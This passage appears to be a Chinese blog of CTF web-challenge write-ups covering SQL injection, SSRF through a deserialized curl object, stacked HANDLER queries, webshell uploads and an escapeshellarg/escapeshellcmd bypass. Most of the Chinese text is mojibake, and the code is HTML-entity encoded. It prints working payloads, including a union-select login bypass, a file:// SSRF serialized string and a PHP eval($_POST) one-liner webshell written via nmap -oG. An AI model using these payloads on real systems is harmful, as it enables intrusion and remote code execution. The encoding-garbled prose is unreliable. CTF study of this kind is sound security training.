åˆ©ç”¨md5ä¸èƒ½å¤„ç†æ•°ç»„ä¼šè¿”å›nullçš„ç‰¹æ€§å°±èƒ½ç»•è¿‡ï¼Œæ¥ä¸‹æ¥è¿›è¡Œä»£ç å®¡è®¡ åŒæ ·å¯ä»¥åˆ©ç”¨md5ä¸èƒ½å¤„ç†æ•°ç»„çš„ç‰¹æ€§ [CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack Worldsqlæ³¨å…¥ï¼Œå…ˆç”¨fuzzæµ‹ä¸€ä¸‹è¿‡æ»¤ï¼ˆbuuçš„ç½‘ç«™å¥½åƒæœ‰posté™åˆ¶ï¼Œæ‰€ä»¥poståˆ°åé¢ä¹‹åä¼šæ˜¾ç¤ºæäº¤æ¬¡æ•°è¿‡å¤šï¼Œè€Œä¸”ä¸çŸ¥é“æ˜¯ä¸æ˜¯bpçš„é—®é¢˜æœ‰äº›æ²¡æœ‰è¿‡æ»¤çš„ä¹Ÿä¼šè¢«æ˜¾ç¤ºä¸ºè¢«è¿‡æ»¤äº† è¿™é‡Œåº”è¯¥è¦é‡‡ç”¨boolç›²æ³¨çš„æ–¹å¼ï¼Œä½†æ˜¯è¿‡æ»¤çš„ä¸œè¥¿æœ‰ç‚¹å¤š å› ä¸ºç©ºæ ¼è¢«è¿‡æ»¤äº†æ‰€ä»¥è¦åˆ©ç”¨ï¼ˆï¼‰æ¥ä»£æ›¿ç©ºæ ¼ æŠ„äº†ä¸ªè„šæœ¬ æ„Ÿè§‰æ˜¯å¾ˆç®€å•çš„ç›²æ³¨ï¼Œç„¶åè¦åˆ©ç”¨pythonç¼–è„šæœ¬ [GXYCTF2019]BabySQli GXYCTF2019]BabySQliâ€”â€”â€œç»•è¿‡md5æ¯”è¾ƒâ€_WHOAMIAnonyçš„åšå®¢-CSDNåšå®¢ å½“ç”¨æˆ·åä¸ºadminæ—¶ï¼Œæç¤ºå¯†ç é”™è¯¯ï¼Œå› æ­¤èƒ½çŸ¥é“ç”¨æˆ·åä¸ºadmin ç™»å½•åè·³è½¬åˆ°search.phpä¸­ï¼Œåœ¨æºç é‡Œå­˜åœ¨ä¸€ä¸ªè¿›è¡ŒbaseåŠ å¯†çš„æç¤º sqlæ³¨å…¥ï¼Œå…ˆfuzzçœ‹ä¸€ä¸‹è¿‡æ»¤ ç„¶åå¯ä»¥åˆ©ç”¨å¤§å†™ç»•è¿‡æŸ¥åˆ°å…±æœ‰3åˆ—ï¼ˆå…¶å®ç›´æ¥unionè¯•ä¹Ÿå¯ä»¥ ä¹‹åè¦åˆ©ç”¨è”åˆæ³¨å…¥ åœ¨è”åˆæŸ¥è¯¢å¹¶ä¸å­˜åœ¨çš„æ•°æ®æ—¶ï¼Œè”åˆæŸ¥è¯¢å°±ä¼šæ„é€ ä¸€ä¸ªè™šæ‹Ÿçš„æ•°æ®ã€‚ åç«¯ä»£ç  &lt;?php$row; $pass&#x3D;$_POST[&#39;pw&#39;]; if($row[&#39;username&#39;]&#x3D;&#x3D;â€™adminâ€™)&#123; if($row[&#39;password&#39;]&#x3D;&#x3D;md5($pass))&#123; echo $flag; &#125;else&#123; echo â€œwrong pass!â€; &#125;&#125; else&#123; echo â€œwrong user!â€;&#125; æ‰€ä»¥å¯ä»¥åœ¨è”åˆæŸ¥è¯¢æ—¶æ„é€ è™šæ‹Ÿçš„æ•°æ®åˆ©ç”¨è¿™ä¸ªæ•°æ®è¿›è¡Œç™»å½•æ“ä½œ username&#x3D;0&#39; union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39; # password&#x3D;123 å¾—åˆ°flag [ç½‘é¼æ¯ 2018]Fakebookå…ˆjoinä¸€ä¸‹ï¼Œç„¶åæºç é‡Œæœ‰ è¿™é‡Œè¿‡æ»¤äº†union select ä¸­é—´å¯ä»¥åŠ ä¸ªæ³¨é‡Šç¬¦æ¥å½“ç©ºæ ¼æ¥ç»•è¿‡å» è¿™ä¸ªé¡µé¢å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œæœ€ç»ˆå¯ä»¥æŸ¥åˆ°è¿™äº› è¿™é‡Œèƒ½çœ‹å‡ºæ¥dataæ˜¯ä¸ªåºåˆ—åŒ–åçš„ç»“æœï¼Œä½†æ˜¯ä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨ ç„¶åæ‰«ä¸€ä¸‹å‘ç° æœ‰robots.txtå¤‡ä»½æ–‡ä»¶ &lt;?php class UserInfo &#123; public $name &#x3D; &quot;&quot;; public $age &#x3D; 0; public $blog &#x3D; &quot;&quot;; public function __construct($name, $age, $blog) &#123; $this-&gt;name &#x3D; $name; $this-&gt;age &#x3D; (int)$age; $this-&gt;blog &#x3D; $blog; &#125; function get($url) &#123; $ch &#x3D; curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output &#x3D; curl_exec($ch); $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode &#x3D;&#x3D; 404) &#123; return 404; &#125; curl_close($ch); return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () &#123; $blog &#x3D; $this-&gt;blog; return preg_match(&quot;&#x2F;^(((http(s?))\\:\\&#x2F;\\&#x2F;)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\&#x2F;\\S*)?$&#x2F;i&quot;, $blog); &#125; &#125; å¥½ï¼Œçœ‹ä¸æ‡‚äº†ï¼ˆ æŠ„ä¸€ä¸‹åˆ«äººçš„åˆ†æ &lt;?php class UserInfo &#123; public $name &#x3D; &quot;&quot;; public $age &#x3D; 0; public $blog &#x3D; &quot;&quot;; public function __construct($name, $age, $blog) &#123; $this-&gt;name &#x3D; $name; $this-&gt;age &#x3D; (int)$age; $this-&gt;blog &#x3D; $blog; &#125; function get($url) &#123; $ch &#x3D; curl_init(); &#x2F;*curl_init()ï¼šåˆå§‹åŒ–ä¸€ä¸ª cURL ä¼šè¯å¹¶ä¸”å…¨éƒ¨çš„é€‰é¡¹éƒ½è¢«è®¾ç½®åè¢«è°ƒç”¨*&#x2F; curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); &#x2F;* curl_setopt â€” ä¸ºç»™å®šçš„cURLä¼šè¯å¥æŸ„è®¾ç½®ä¸€ä¸ªé€‰é¡¹ã€‚ è¯´æ˜ï¼š bool curl_setopt ( resource $ch , int $option , mixed $value ) å‚æ•°: chï¼šç”± curl_init() è¿”å›çš„ cURL å¥æŸ„ã€‚ optionï¼šéœ€è¦è®¾ç½®çš„CURLOPT_XXXé€‰é¡¹ã€‚ valueï¼šå°†è®¾ç½®åœ¨optioné€‰é¡¹ä¸Šçš„å€¼ã€‚ å¯¹äºä¸‹é¢çš„è¿™äº›optionçš„å¯é€‰å‚æ•°ï¼Œvalueåº”è¯¥è¢«è®¾ç½®ä¸€ä¸ªboolç±»å‹çš„å€¼ï¼š CURLOPT_RETURNTRANSFERï¼šå°†curl_exec()è·å–çš„ä¿¡æ¯ä»¥æ–‡ä»¶æµçš„å½¢å¼è¿”å›ï¼Œè€Œä¸æ˜¯ç›´æ¥è¾“å‡ºã€‚ å¯¹äºä¸‹é¢çš„è¿™äº›optionçš„å¯é€‰å‚æ•°ï¼Œvalueåº”è¯¥è¢«è®¾ç½®ä¸€ä¸ªstringç±»å‹çš„å€¼ï¼š CURLOPT_URLï¼šéœ€è¦è·å–çš„URLåœ°å€ï¼Œä¹Ÿå¯ä»¥åœ¨curl_init()å‡½æ•°ä¸­è®¾ç½®ã€‚ ################### æ–‡ä»¶æµçš„å½¢å¼:æŒ‡çš„æ˜¯åœ¨ä¼ é€’è¿‡ç¨‹ä¸­çš„æ–‡ä»¶,æ¯”å¦‚ä½ ä¸Šä¼ ä¸€å¼ å›¾ç‰‡,é‚£ä¹ˆä»–ä¸æ˜¯ä»¥ä¸€ä¸ªå®Œæ•´çš„å›¾ç‰‡ä¼ è¾“çš„,æ˜¯å°†æ–‡ä»¶æŒ‰ç‰¹å®šç¼–ç çš„å­—ç¬¦ä¼ è¾“.è¿™ä¸ªå°±æ˜¯æ–‡ä»¶æµ *&#x2F; $output &#x3D; curl_exec($ch); &#x2F;*curl_exec ï¼šæ‰§è¡Œ cURL ä¼šè¯*&#x2F; $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE); &#x2F;* curl_getinfo â€” è·å–ä¸€ä¸ªcURLè¿æ¥èµ„æºå¥æŸ„çš„ä¿¡æ¯ è¯´æ˜ï¼š mixed curl_getinfo ( resource $ch [, int $opt &#x3D; 0 ] )è·å–æœ€åä¸€æ¬¡ä¼ è¾“çš„ç›¸å…³ä¿¡æ¯ã€‚ å‚æ•°ï¼š ch ç”± curl_init() è¿”å›çš„ cURL å¥æŸ„ã€‚ optï¼šè¿™ä¸ªå‚æ•°å¯èƒ½æ˜¯ä»¥ä¸‹å¸¸é‡ä¹‹ä¸€: CURLINFO_HTTP_CODE : æœ€åä¸€ä¸ªæ”¶åˆ°çš„HTTPä»£ç  *&#x2F; if($httpCode &#x3D;&#x3D; 404) &#123; return 404; &#125; curl_close($ch); return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () &#123; $blog &#x3D; $this-&gt;blog; return preg_match(&quot;&#x2F;^(((http(s?))\\:\\&#x2F;\\&#x2F;)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\&#x2F;\\S*)?$&#x2F;i&quot;, $blog); &#125; cURLæ˜¯ä¸€ä¸ªåˆ©ç”¨URLè¯­æ³•åœ¨å‘½ä»¤è¡Œä¸‹å·¥ä½œçš„æ–‡ä»¶ä¼ è¾“å·¥å…·ï¼Œ1997å¹´é¦–æ¬¡å‘è¡Œã€‚å®ƒæ”¯æŒæ–‡ä»¶ä¸Šä¼ å’Œä¸‹è½½ï¼Œæ‰€ä»¥æ˜¯ç»¼åˆä¼ è¾“å·¥å…·ï¼Œä½†æŒ‰ä¼ ç»Ÿï¼Œä¹ æƒ¯ç§°cURLä¸ºä¸‹è½½å·¥å…·ã€‚ cURLè¿˜åŒ…å«äº†ç”¨äºç¨‹åºå¼€å‘çš„libcurlã€‚ PHPæ”¯æŒçš„ç”±Daniel Stenbergåˆ›å»ºçš„libcurlåº“å…è®¸ä½ ä¸å„ç§çš„æœåŠ¡å™¨ä½¿ç”¨å„ç§ç±»å‹çš„åè®®è¿›è¡Œè¿æ¥å’Œé€šè®¯ã€‚ libcurlç›®å‰æ”¯æŒhttpã€httpsã€ftpã€gopherã€telnetã€dictã€fileå’Œldapåè®®ã€‚libcurlåŒæ—¶ä¹Ÿæ”¯æŒHTTPSè®¤è¯ã€HTTP POSTã€HTTP PUTã€ FTP ä¸Šä¼ (è¿™ä¸ªä¹Ÿèƒ½é€šè¿‡PHPçš„FTPæ‰©å±•å®Œæˆ)ã€HTTP åŸºäºè¡¨å•çš„ä¸Šä¼ ã€ä»£ç†ã€cookieså’Œç”¨æˆ·å+å¯†ç çš„è®¤è¯ã€‚ PHPä¸­ä½¿ç”¨cURLå®ç°Getå’ŒPostè¯·æ±‚çš„æ–¹æ³• è¿™äº›å‡½æ•°åœ¨PHP 4.0.2ä¸­è¢«å¼•å…¥ã€‚ æ–°çŸ¥è¯†ï¼šè¿™é‡Œåˆ©ç”¨äº†ssrfæ¼æ´ SSRFæ¼æ´æ”»å‡»åŸç†åŠé˜²å¾¡æ–¹æ¡ˆ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ· SSRF æ¼æ´è®°å½•_å‘å“¥å¾®è¯¾å ‚-CSDNåšå®¢ SSRFæ¼æ´(åŸç†&amp;ç»•è¿‡å§¿åŠ¿) - T00ls.Net SSRFï¼ˆServer-Side Request Forgeryï¼‰ä¹Ÿå±äºåº”ç”¨å±‚ä¸Šçš„ä¸€ä¸ªæ¼æ´ç±»å‹ï¼Œç”¨ä¸€ä¸ªæœ€ç®€å•çš„ä¾‹å­æ¥ç†è§£è¿™ä¸ªæ¼æ´ï¼šæ¯”å¦‚ä¸€ä¸ªæ·»åŠ å›¾æ–‡çš„åŠŸèƒ½ï¼Œå¡«å…¥æ ‡é¢˜å†…å®¹å’Œå°é¢å›¾ç„¶åæäº¤åœ¨ç½‘ç«™å‰å°æ˜¾ç¤ºï¼Œå¯¹äºè¿™ä¸ªåŠŸèƒ½çš„å›¾ç‰‡å®ƒé™¤äº†å¯ä»¥è®©ä½ ä¸Šä¼ ä»¥å¤–ï¼Œè¿˜æ”¯æŒå¡«å…¥è¿œç¨‹å›¾ç‰‡åœ°å€ï¼Œå¦‚æœä½ å¡«å…¥äº†è¿œç¨‹çš„å›¾ç‰‡åœ°å€ï¼Œåˆ™è¯¥ç½‘ç«™ä¼šåŠ è½½è¿œç¨‹å›¾è¿‡æ¥è¿›è¡Œæ˜¾ç¤ºï¼Œè€Œå¦‚æœç¨‹åºå†™æ³•ä¸ä¸¥è°¨æˆ–è€…è¿‡æ»¤ä¸ä¸¥æ ¼ï¼Œåˆ™åŠ è½½å›¾ç‰‡åœ°å€çš„è¿™ä¸ªåŠŸèƒ½å¯èƒ½å°±å¯ä»¥åŒ…å«è¿›è¡Œä¸€äº›æ¶æ„çš„è„šæœ¬æ–‡ä»¶ï¼Œæˆ–è€…ä½ è¾“å…¥å†…ç½‘çš„ ip æˆ–è€…ä¸€äº›ç³»ç»Ÿçš„æ–‡ä»¶éƒ½ä¼šè¢«è§£ææ‰§è¡Œï¼Œè¿™ä¸ªæˆ‘ä»¬ä¸€èˆ¬å«å®ƒ SSRF å³æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ã€‚ curl ä½¿ç”¨çš„ç»å…¸è¿‡ç¨‹ï¼Œåˆå§‹åŒ–ï¼Œç„¶åè®¾ç½®è®¿é—®çš„åœ°å€ï¼Œéšåæ‰§è¡Œï¼Œæœ€åå…³é—­ã€‚ å°†URLæ¢æˆfile://çš„å½¢å¼ï¼Œå°±å¯ä»¥è¯»å–æœ¬åœ°æ–‡ä»¶ã€‚ è¿™é‡Œæˆ‘ä»¬è¦è®¿é—®çš„æ˜¯flag.phpï¼Œæ‰€ä»¥æŒ‰ç…§ä¹‹å‰sqlæ³¨å…¥å¾—å‡ºæ¥çš„åºåˆ—åŒ–å†…å®¹è¿›è¡Œä¿®æ”¹ æœ€ç»ˆpayloadä¸º ?no&#x3D;-1%20union&#x2F;**&#x2F;select 1,(select%20group_concat(no,username,passwd,data)%20from%20users),3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:27:&quot;file:&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39; çœ‹ä¸€ä¸‹æºç ï¼Œæ‰¾åˆ°flag [GYCTF2020]Blacklistè¿™ä¸ªçœ‹èµ·æ¥å’Œå¼ºç½‘æ¯é‚£ä¸ªæœ‰ç‚¹åƒ åŒæ ·ä¹Ÿæ˜¯å †å æ³¨å…¥ å¯ä»¥ç”¨ 1&#39;;show tables;#æŸ¥è¡¨ flagåº”è¯¥å°±åœ¨flaghereè¿™ä¸ªè¡¨é‡Œ çœ‹ä¸€ä¸‹åˆ—å æƒ³æŸ¥çœ‹çš„æ—¶å€™å‘ç°å­˜åœ¨è¿‡æ»¤ è¿™é‡Œå¯ä»¥åˆ©ç”¨headler HANDLER â€¦ OPENè¯­å¥æ‰“å¼€ä¸€ä¸ªè¡¨ï¼Œä½¿å…¶å¯ä»¥ä½¿ç”¨åç»­HANDLER â€¦ READè¯­å¥è®¿é—®ï¼Œè¯¥è¡¨å¯¹è±¡æœªè¢«å…¶ä»–ä¼šè¯å…±äº«ï¼Œå¹¶ä¸”åœ¨ä¼šè¯è°ƒç”¨HANDLER â€¦ CLOSEæˆ–ä¼šè¯ç»ˆæ­¢ä¹‹å‰ä¸ä¼šå…³é—­ æœ€ç»ˆpayloadï¼š1&#39;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;# ï¼ˆè¯•äº†ä¸€ä¸‹åˆ©ç”¨headlerå¼ºç½‘æ¯çš„æ‹¿åˆ°ä¹Ÿèƒ½æ³¨å‡ºæ¥ å…³äºhandlerå‘½ä»¤è½¬è½½è‡ª:https://blog.csdn.net/jesseyoung/article/details/40785137 mysqlé™¤å¯ä½¿ç”¨selectæŸ¥è¯¢è¡¨ä¸­çš„æ•°æ®ï¼Œä¹Ÿå¯ä½¿ç”¨handlerè¯­å¥ï¼Œè¿™æ¡è¯­å¥ä½¿æˆ‘ä»¬èƒ½å¤Ÿä¸€è¡Œä¸€è¡Œçš„æµè§ˆä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®ï¼Œä¸è¿‡handlerè¯­å¥å¹¶ä¸å…·å¤‡selectè¯­å¥çš„æ‰€æœ‰åŠŸèƒ½ã€‚å®ƒæ˜¯mysqlä¸“ç”¨çš„è¯­å¥ï¼Œå¹¶æ²¡æœ‰åŒ…å«åˆ°SQLæ ‡å‡†ä¸­ã€‚HANDLERè¯­å¥æä¾›é€šå¾€è¡¨çš„ç›´æ¥é€šé“çš„å­˜å‚¨å¼•æ“æ¥å£ï¼Œå¯ä»¥ç”¨äºMyISAMå’ŒInnoDBè¡¨ã€‚ åŸºæœ¬è¯­æ³•ï¼š HANDLER tbl_name OPEN [ [AS] alias] HANDLER tbl_name READ index_name &#123; &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; &#125; (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125; [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name READ &#123; FIRST | NEXT &#125; [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name CLOSE é€šè¿‡HANDLER tbl_name OPENæ‰“å¼€ä¸€å¼ è¡¨ï¼Œæ— è¿”å›ç»“æœï¼Œå®é™…ä¸Šæˆ‘ä»¬åœ¨è¿™é‡Œå£°æ˜äº†ä¸€ä¸ªåä¸ºtb1_nameçš„å¥æŸ„ã€‚é€šè¿‡HANDLER tbl_name READ FIRSTè·å–å¥æŸ„çš„ç¬¬ä¸€è¡Œï¼Œé€šè¿‡READ NEXTä¾æ¬¡è·å–å…¶å®ƒè¡Œã€‚æœ€åä¸€è¡Œæ‰§è¡Œä¹‹åå†æ‰§è¡ŒNEXTä¼šè¿”å›ä¸€ä¸ªç©ºçš„ç»“æœã€‚é€šè¿‡HANDLER tbl_name CLOSEæ¥å…³é—­æ‰“å¼€çš„å¥æŸ„ã€‚ é€šè¿‡ç´¢å¼•å»æŸ¥çœ‹çš„è¯å¯ä»¥æŒ‰ç…§ä¸€å®šçš„é¡ºåºï¼Œè·å–è¡¨ä¸­çš„æ•°æ®ã€‚é€šè¿‡HANDLER tbl_name READ index_name FIRSTï¼Œè·å–å¥æŸ„ç¬¬ä¸€è¡Œï¼ˆç´¢å¼•æœ€å°çš„ä¸€è¡Œï¼‰ï¼ŒNEXTè·å–ä¸‹ä¸€è¡Œï¼ŒPREVè·å–å‰ä¸€è¡Œï¼ŒLASTè·å–æœ€åä¸€è¡Œï¼ˆç´¢å¼•æœ€å¤§çš„ä¸€è¡Œï¼‰ã€‚ é€šè¿‡ç´¢å¼•åˆ—æŒ‡å®šä¸€ä¸ªå€¼ï¼Œå¯ä»¥æŒ‡å®šä»å“ªä¸€è¡Œå¼€å§‹ã€‚é€šè¿‡HANDLER tbl_name READ index_name = valueï¼ŒæŒ‡å®šä»å“ªä¸€è¡Œå¼€å§‹ï¼Œé€šè¿‡NEXTç»§ç»­æµè§ˆã€‚ å¦‚æœæˆ‘ä»¬ä¸æƒ³æµè§ˆä¸€ä¸ªè¡¨çš„æ‰€æœ‰è¡Œï¼Œå¯ä»¥ä½¿ç”¨whereå’Œlimitå­å¥ã€‚ [GXYCTF2019]BabyUploadè¿™ä¸ªå’Œä¹‹å‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„é¢˜å·®ä¸å¤šï¼Œä¸Šä¼ æ—¶è¿‡æ»¤äº†phåç¼€åï¼Œæ‰€ä»¥è¦ä¸Šä¼ ä¸ªå›¾ç‰‡é©¬ï¼ŒåŒæ—¶è¿˜è¦ä¸Šä¼ ä¸ª.htaccessæ–‡ä»¶è§£æå›¾ç‰‡é©¬ï¼Œç”¨bpæŠ“åŒ…æŠŠç±»å‹æ”¹æˆimage/jpegå°±è¡Œ ç„¶åèœåˆ€ç»ƒä¸€ä¸‹åœ¨æ ¹ç›®å½•é‡Œå°±èƒ½æ‰¾åˆ°flag [BUUCTF 2018]Online Toolå…ˆç›´æ¥è´´å‚è€ƒçš„æ–‡ç« äº† [BUUCTF__BUUCTF 2018]Online Tool_é¢˜è§£_é£è¿‡æ±Ÿå—ä¹±çš„åšå®¢-CSDNåšå®¢ [BUUCTF 2018]Online Tool_æ²ç›®çš„åšå®¢-CSDNåšå®¢ è°ˆè°ˆescapeshellargå‚æ•°ç»•è¿‡å’Œæ³¨å…¥çš„é—®é¢˜ (lmxspace.com) PHP escapeshellarg()+escapeshellcmd() ä¹‹æ®‡ (seebug.org) [2020/7/08 - BUUCTF 2018]Online Tool - nmap\\escapeshellargä¸escapeshellcmdè¿ç”¨_M4xlmumçš„åšå®¢-CSDNåšå®¢ å…ˆæ˜¯ä»£ç å®¡è®¡ï¼Œåˆæ˜¯æ²¡è§è¿‡çš„ä¸œè¥¿ ç¬¬ä¸€ä¸ªifè¯­å¥å¥½åƒæ²¡å•¥ç”¨ åœ¨PHP ä¸­ä½¿ç”¨ *$_SERVER[&quot;REMOTE_ADDR&quot;]* æ¥å–å¾—å®¢æˆ·ç«¯çš„ IPåœ°å€ï¼Œä½†å¦‚æœå®¢æˆ·ç«¯æ˜¯ä½¿ç”¨ä»£ç†æœåŠ¡å™¨æ¥è®¿é—®ï¼Œé‚£å–åˆ°çš„å°± æ˜¯ä»£ç†æœåŠ¡å™¨çš„ IP åœ°å€ï¼Œè€Œä¸æ˜¯çœŸæ­£çš„å®¢æˆ·ç«¯ IP åœ°å€ã€‚è¦æƒ³é€è¿‡ä»£ç†æœåŠ¡å™¨å–å¾—å®¢æˆ·ç«¯çš„çœŸå® IP åœ°å€ï¼Œå°±è¦ä½¿ç”¨ *$_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;]* æ¥è¯»å–ã€‚ ä¸è¿‡è¦æ³¨æ„çš„äº‹ï¼Œå¹¶ä¸æ˜¯æ¯ä¸ªä»£ç†æœåŠ¡å™¨éƒ½èƒ½ç”¨ $_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;] æ¥è¯»å–å®¢æˆ·ç«¯çš„çœŸå®IPï¼Œæœ‰äº›ç”¨æ­¤ æ–¹æ³•è¯»å–åˆ°çš„ä»ç„¶æ˜¯ä»£ç†æœåŠ¡å™¨çš„ IPã€‚ ç¬¬äºŒä¸ªifè¯­å¥æ˜¯è¦æ±‚ä¼ å…¥ä¸€ä¸ªå‚æ•°ç„¶ååˆ©ç”¨escapeshellargå’Œescapeshellcmdä¸¤ä¸ªå‡½æ•°çš„æ¼æ´å®ç°systemå‘½ä»¤æ‰§è¡Œ &#96;escapeshellarg&#96;ï¼Œä¼šåœ¨å­—ç¬¦ä¸²ä¸­æ‰€æœ‰çš„å•å¼•å·ï¼ˆåŒ…æ‹¬æˆå¯¹å­˜åœ¨é—­åˆçš„ï¼‰å‰æ·»åŠ ä¸€ä¸ª&#96;&#39;\\&#39;&#96; ï¼Œè‹¥å·²ç»ç”¨&#96;\\&#96;è½¬ä¹‰ï¼Œåˆ™ä¼šç”¨å¹¶ä¸”ç”¨&#96;&#39;\\&#39;&#96; æ›¿æ¢&#96;\\&#96;ï¼Œæœ€åå°†æ•´ä¸ªå˜é‡ç”¨å•å¼•å·åŒ…è£¹ã€‚ escapeshellcmd&#96;ï¼Œä¼šå°†å­—ç¬¦ä¸²ä¸­æœªè¢«è½¬ä¹‰çš„åŒå¼•å·æˆ–å•å¼•å·è½¬ä¹‰ï¼ˆæˆå¯¹å­˜åœ¨é—­åˆçš„åŒå¼•å·æˆ–å•å¼•å·é™¤å¤–ï¼‰è‹¥å·²è¢«è½¬ä¹‰ï¼Œåˆ™ç”¨&#96;\\\\\\&quot;&#96;æˆ–&#96;\\\\\\&#39;&#96;æ›¿&#96;\\&quot;&#96;æˆ–&#96;\\&#39; è¿™ä¸ªæ¼æ´ç±»ä¼¼è¿™ç§ mkdirå‘½ä»¤æ˜¯Linuxä¸­çš„æ–°å»ºæ–‡ä»¶å¤¹ chdiræ”¹å˜ç›®å½• æœ€åå°±æ˜¯systemçš„å‘½ä»¤æ‰§è¡Œäº†ï¼Œè¿™é‡Œé¢æ˜¯nmapçš„ä¸€äº›å‘½ä»¤ -T5 :æ‰«æç­‰çº§,è¶Šå¤§è¶Šå¿«,è¶Šå¿«è¶Šä¸å®‰å…¨,æœ€å¥½è®¾ç½®ä¸º-T4 -sT :TCP connent æ‰«æ,ä¸å¤ªå®‰å…¨(ç•™ä¸‹è®°å½•ä¿¡æ¯),è€Œä¸”é€Ÿåº¦è¾ƒæ…¢,ä¸€èˆ¬å…ˆä½¿ç”¨-sSæµ‹è¯• -Pn :ç¦ç”¨ping -host-timeout 2:è®¾ç½®æ‰«æä¸€å°ä¸»æœºçš„æ—¶é—´ï¼Œä»¥æ¯«ç§’ä¸ºå•ä½ã€‚ -F :å¿«é€Ÿæ‰«ææ¨¡å¼ï¼Œåªæ‰«æåœ¨nmap-servicesæ–‡ä»¶ä¸­åˆ—å‡ºçš„ç«¯å£ã€‚ -oG test.txt: å°†æ‰«æç»“æœç”Ÿæˆ test.txt æ–‡ä»¶ æ¥ä¸‹æ¥å°±æ˜¯æƒ³åŠæ³•åˆ©æ¼æ´ç»™é‡Œé¢ä¼ å…¥ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ payload &#39;&lt;?php eval($_POST[&quot;a&quot;]);?&gt; -oG 1.php &#39; ç„¶åç»è¿‡escapeshellargå’Œescapeshellcmdä¸¤ä¸ªå‡½æ•°å°±ä¼šå˜æˆç±»ä¼¼è¿™ç§ &#39; &#39;\\\\&#39;&#39;\\&lt;\\?php eval\\(\\)\\;\\?\\&gt; -oG 1.php &#39;\\\\&#39;&#39; &#39; è¿™é‡Œå•å¼•å·éƒ½é—­åˆäº†ä¸ä¼šå½±å“åˆ°ä¼ å…¥çš„ä¸€å¥è¯æœ¨é©¬ ä¹‹åå°±å¯ä»¥ç”¨èœåˆ€è¿æ¥æ‰¾flagäº† e9612257fa1c5134d014e95a7440d357 è¿™æ˜¯ä¸Šä¼ åçš„åœ°å€ èœåˆ€è¿ä¸€ä¸‹http://d26a51d3-a34a-46e5-9be3-80b3a129befb.node4.buuoj.cn/ e9612257fa1c5134d014e95a7440d357/1.php æ ¹ç›®å½•æ‰¾åˆ°flag [RoarCTF 2019]Easy Javaé¦–å…ˆæ˜¯ä¸ªç™»å½•æ¡† çœ‹ä¸€ä¸‹helpçš„å†…å®¹ è¯•è¯•æŠ“åŒ…ç„¶åæ”¹ä¸€ä¸‹è¯·æ±‚æ–¹å¼åä¼šä¸‹è½½ä¸€ä¸ªwordæ–‡æ¡£ï¼Œæ²¡å•¥ç”¨ è¿™é‡Œæœ‰ä¸ªæ¼æ´WEB-INF/web.xmlæ³„éœ² WEB-INFä¸»è¦åŒ…å«ä¸€ä¸‹æ–‡ä»¶æˆ–ç›®å½•: &#x2F;WEB-INF&#x2F;web.xmlï¼šWebåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚ &#x2F;WEB-INF&#x2F;classes&#x2F;ï¼šå«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­ &#x2F;WEB-INF&#x2F;lib&#x2F;ï¼šå­˜æ”¾webåº”ç”¨éœ€è¦çš„å„ç§JARæ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚ä½¿ç”¨çš„jaræ–‡ä»¶,å¦‚æ•°æ®åº“é©±åŠ¨jaræ–‡ä»¶ &#x2F;WEB-INF&#x2F;src&#x2F;ï¼šæºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶ã€‚ &#x2F;WEB-INF&#x2F;database.propertiesï¼šæ•°æ®åº“é…ç½®æ–‡ä»¶ æ¼æ´æ£€æµ‹ä»¥åŠåˆ©ç”¨æ–¹æ³•ï¼šé€šè¿‡æ‰¾åˆ°web.xmlæ–‡ä»¶ï¼Œæ¨æ–­classæ–‡ä»¶çš„è·¯å¾„ï¼Œæœ€åç›´æ¥classæ–‡ä»¶ï¼Œåœ¨é€šè¿‡åç¼–è¯‘classæ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç  æ¼æ´æˆå›  